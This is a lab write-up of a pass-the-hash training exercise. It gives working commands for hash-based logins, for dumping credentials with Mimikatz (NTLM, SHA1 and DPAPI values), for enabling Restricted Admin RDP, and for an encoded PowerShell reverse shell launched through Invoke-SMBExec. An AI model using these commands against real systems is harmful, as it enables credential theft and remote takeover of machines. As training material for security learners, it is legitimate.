### Pass the Hash Exercise
 
IP: 10.129.204.23 (DC01)
 
---
 
### Question 1:
Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.
 
I start off by using evil-winrm to connect using the hash.
 
```diff
+ $ evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+ *Evil-WinRM* PS C:\> cat pth.txt
```
 
	G3t_4CCE$$_V1@_PTH
 
&#x1F6A9; found **G3t_4CCE$$_V1@_PTH**.
 
---
 
### Question 2:
Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.
 
The name of the registry value that must be set to 0 is DisableRestrictedAdmin, and I did so in the evil-winrm session like so.
 
```diff
+ C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
 
Afterwards, I attempt an RDP connection like so.
 
```diff
+ $ xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```
 
It works.
 
&#x1F6A9; found **DisableRestrictedAdmin**.
 
---
 
### Question 3:
Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?
 
So I now open up command prompt and navigate to C:\tools\ to start using mimikatz to extract the hashes present in the current session.
 
```diff
+ C:\Users\Administrator> cd C:\tools
+ C:\tools> mimikatz.exe
+ mimikatz # privilege::debug
+ mimikatz # sekurlsa::logonpasswords
```
 
	<snip>
	         * Username : david
	         * Domain   : INLANEFREIGHT
	         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
	         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
	         * DPAPI    : eaa6db50c1544304014d858928d9694f
	<snip>
	         * Username : john
	         * Domain   : INLANEFREIGHT
	         * NTLM     : c4b0e1b10c7ce2c4723b4e2407ef81a2
	         * SHA1     : 31f8f4dfcb16205363b35055ebe92a75f0a19ce3
	         * DPAPI    : 2e54e60846c83d96cf8d9523b5c0df61
	<snip>
	         * Username : julio
	         * Domain   : INLANEFREIGHT
	         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
	         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
	         * DPAPI    : 634db497baef212b777909a4ccaaf700
	<snip>
 
&#x1F6A9; found **c39f2beb3d2ec06a62cb887fb391dee0**.
 
---
 
### Question 4:
Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.
 
From this output, I have David's account hash and can now use that hash to connect to his shared folder.
 
```diff
+ mimikatz # sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe
+ C:\Windows\system32> type \\DC01\david\david.txt
```
 
	D3V1d_Fl5g_is_Her3
 
&#x1F6A9; found **D3V1d_Fl5g_is_Her3**.
 
---
 
### Question 5:
Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.
 
Now I do the same with Julio.
 
```diff
+ mimikatz # sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe
+ C:\Windows\system32> type \\DC01\julio\julio.txt
```
 
	JuL1()_SH@re_fl@g
 
&#x1F6A9; found **JuL1()_SH@re_fl@g**.
 
---
 
### Question 6:
Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
 
For the next question I must perform a reverse shell and get a connection from the DC01 machine, so I start off by launching PowerShell as the user julio.
 
```diff
+ mimikatz # sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:powershell.exe
```
 
	PS C:\Windows\system32>
 
I then, in a separate PowerShell window, run an ipconfig to see the IP that DC01 sees MS01 as, and then launch nc and have it listen on port 8001.
 
```diff
+ PS C:\tools> ipconfig
```
 
	<snip>
	IPV4 Address . . . . . . . . . . . . 172.16.1.5
	<snip>
 
```diff
+ PS C:\tools> .\nc.exe -lvnp 8001
```
 
Next I use that IP and port, visit revshells.com and make a reverse shell string, paste it to a file, and download that file on the RDP session.
 
```diff
+ $ nvim text.txt
+ $ python3 -m http.server
+ PS C:\tools> (New-Object Net.WebClient).DownloadFile('http://10.10.14.109:8000/text.txt','C:\tools\text.txt')
```
 
Next I import the Invoke-TheHash module and run SMBExec against the DC01 machine so that it runs a reverse shell connection to my listener.
 
```diff
+ PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```
 
Finally, in my other window that I have my netcat listener running on, I get a connection, and from there, navigate to C:\julio\ to read the flag.txt.
 
```diff
+ PS C:\Windows\system32> cd C:\julio
+ PS C:\julio> cat flag.txt
```
 
	Jul1()_N3w_fl@g
 
&#x1F6A9; found **Jul1()_N3w_fl@g**.
 
---
 
### Optional Exercise 1:
John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.
 
For the optional exercise, an attempt to connect via Impacket results in this.
 
```diff
+ $ impacket-psexec john@10.129.204.23 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
```
 
	Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
	[*] Requesting shares on 10.129.204.23.....
	[-] share 'ADMIN$' is not writable.
	[-] share 'C$' is not writable
 
But an evil-winrm connection goes through.
 
```diff
+ $ evil-winrm -i 10.129.204.23 -u john -H c4b0e1b10c7ce2c4723b4e2407ef81a2
```
 
	*Evil-WinRM* PS C:\Users\john\Documents>
 
DONE

